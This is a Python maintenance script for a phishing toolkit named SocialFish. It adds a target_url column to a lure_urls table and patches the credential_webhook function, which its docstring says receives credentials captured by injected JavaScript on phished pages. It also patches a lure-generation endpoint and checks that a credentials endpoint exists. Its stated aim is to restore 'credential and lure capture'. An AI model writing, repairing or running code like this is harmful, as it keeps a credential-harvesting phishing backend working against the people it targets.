#!/usr/bin/env python3
"""
Fix Script for Real Data Capture System
Addresses bugs preventing credential and lure capture
"""

import sqlite3
import sys

def fix_database():
    """Add missing target_url column to lure_urls table"""
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        
        # Check if target_url column exists
        cursor.execute("PRAGMA table_info(lure_urls)")
        columns = [row[1] for row in cursor.fetchall()]
        
        if 'target_url' not in columns:
            print("[*] Adding target_url column to lure_urls table...")
            cursor.execute("ALTER TABLE lure_urls ADD COLUMN target_url TEXT")
            conn.commit()
            print("[OK] target_url column added successfully")
        else:
            print("[OK] target_url column already exists")
        
        conn.close()
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def fix_code():
    """Fix cursor issues in SocialFish.py"""
    try:
        # Read the file
        with open('SocialFish.py', 'r') as f:
            content = f.read()
        
        # Count fixes
        fixes = 0
        
        # Fix 1: credential_webhook function - line ~630
        old_credential = """def credential_webhook():
    \"\"\"
    Webhook endpoint for capturing credentials from injected JavaScript.
    Called by hook.js when form is submitted on phished page.
    \"\"\"
    try:
        cur = g.db
        form_data = request.form.to_dict()"""
        
        new_credential = """def credential_webhook():
    \"\"\"
    Webhook endpoint for capturing credentials from injected JavaScript.
    Called by hook.js when form is submitted on phished page.
    \"\"\"
    try:
        cur = g.db.cursor()
        form_data = request.form.to_dict()"""
        
        if old_credential in content:
            content = content.replace(old_credential, new_credential)
            print("[OK] Fixed credential_webhook cursor")
            fixes += 1
        
        # Fix 2: generate-lure function - around line 2345
        old_lure = """        data = request.json or request.form
        template_id = data.get('template_id', 1)
        target_url = data.get('target_url', 'http://localhost:5000')  # CAPTURE TARGET URL
        campaign_name = data.get('campaign_name', 'phishing')
        
        print(f\"\\n{'='*80}\")
        print(f\"[LURE START] Generating lure URL...\")
        print(f\"[LURE] Template ID: {template_id}\")
        print(f\"[LURE] Target URL: {target_url}\")
        print(f\"[LURE] Campaign: {campaign_name}\")
        logger.info(f\"[LURE START] Template: {template_id}, Target: {target_url}, Campaign: {campaign_name}\")
        
        cur = g.db"""
        
        new_lure = """        data = request.json or request.form
        template_id = data.get('template_id', 1)
        target_url = data.get('target_url', 'http://localhost:5000')  # CAPTURE TARGET URL
        campaign_name = data.get('campaign_name', 'phishing')
        
        print(f\"\\n{'='*80}\")
        print(f\"[LURE START] Generating lure URL...\")
        print(f\"[LURE] Template ID: {template_id}\")
        print(f\"[LURE] Target URL: {target_url}\")
        print(f\"[LURE] Campaign: {campaign_name}\")
        logger.info(f\"[LURE START] Template: {template_id}, Target: {target_url}, Campaign: {campaign_name}\")
        
        cur = g.db.cursor()"""
        
        if old_lure in content:
            content = content.replace(old_lure, new_lure)
            print("[OK] Fixed generate-lure cursor")
            fixes += 1
        
        # Write back
        with open('SocialFish.py', 'w') as f:
            f.write(content)
        
        print(f"[OK] Fixed {fixes} cursor issues in SocialFish.py")
        return True
    except Exception as e:
        print(f"[!] Error fixing code: {e}")
        return False

def verify_fixes():
    """Verify all fixes are in place"""
    try:
        with open('SocialFish.py', 'r') as f:
            content = f.read()
        
        checks = []
        
        # Check 1: credential_webhook uses cursor
        check1 = "def credential_webhook():" in content and "cur = g.db.cursor()" in content
        checks.append(("credential_webhook uses cursor", check1))
        
        # Check 2: generate-lure uses cursor
        check2 = "@app.route(\"/api/generate-lure\"" in content and "cur = g.db.cursor()" in content
        checks.append(("generate-lure uses cursor", check2))
        
        # Check 3: /api/credentials endpoint exists
        check3 = "@app.route(\"/api/credentials\"" in content
        checks.append(("credentials endpoint exists", check3))
        
        print("\n[*] Verification Results:")
        all_good = True
        for check_name, result in checks:
            status = "[OK]" if result else "[!]"
            print(f"  {status} {check_name}")
            if not result:
                all_good = False
        
        return all_good
    except Exception as e:
        print(f"[!] Verification error: {e}")
        return False

if __name__ == "__main__":
    print("[*] Starting Real Data Capture Fix Script\n")
    
    # Fix database schema
    if not fix_database():
        print("[!] Database fix failed")
        sys.exit(1)
    
    print()
    
    # Fix code issues
    if not fix_code():
        print("[!] Code fix failed")
        sys.exit(1)
    
    print()
    
    # Verify
    if verify_fixes():
        print("\n[OK] All fixes applied successfully!")
        print("[*] Restart the server to apply changes")
        sys.exit(0)
    else:
        print("\n[!] Some fixes may need manual attention")
        sys.exit(1)
